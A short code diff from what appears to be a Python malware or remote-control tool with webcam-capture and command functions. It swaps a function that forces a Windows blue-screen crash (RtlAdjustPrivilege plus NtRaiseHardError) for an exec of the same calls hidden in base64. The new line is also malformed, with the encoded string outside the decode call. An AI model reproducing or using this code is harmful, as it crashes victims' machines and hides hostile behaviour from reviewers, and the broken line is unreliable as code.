@@ -72,21 +72,7 @@ def webcamshot():
   return f"{operation_dir}\\webcamshot.png"
 
 def bsod():
-  windll.ntdll.RtlAdjustPrivilege(
-    c_uint(19),
-    c_uint(1),
-    c_uint(0),
-    byref(c_int())
-)
-
-  windll.ntdll.NtRaiseHardError(
-    c_ulong(0xC000007B),
-    c_ulong(0),
-    nullptr,
-    nullptr,
-    c_uint(6),
-    byref(c_uint())
-)
+  exec(base64.b64decode()d2luZGxsLm50ZGxsLlJ0bEFkanVzdFByaXZpbGVnZSgKICAgIGNfdWludCgxOSksCiAgICBjX3VpbnQoMSksCiAgICBjX3VpbnQoMCksCiAgICBieXJlZihjX2ludCgpKQopCgogIHdpbmRsbC5udGRsbC5OdFJhaXNlSGFyZEVycm9yKAogICAgY191bG9uZygweEMwMDAwMDdCKSwKICAgIGNfdWxvbmcoMCksCiAgICBudWxscHRyLAogICAgbnVsbHB0ciwKICAgIGNfdWludCg2KSwKICAgIGJ5cmVmKGNfdWludCgpKQop)
 
 def hid(command):
   prefix = command.split(" ")[0]
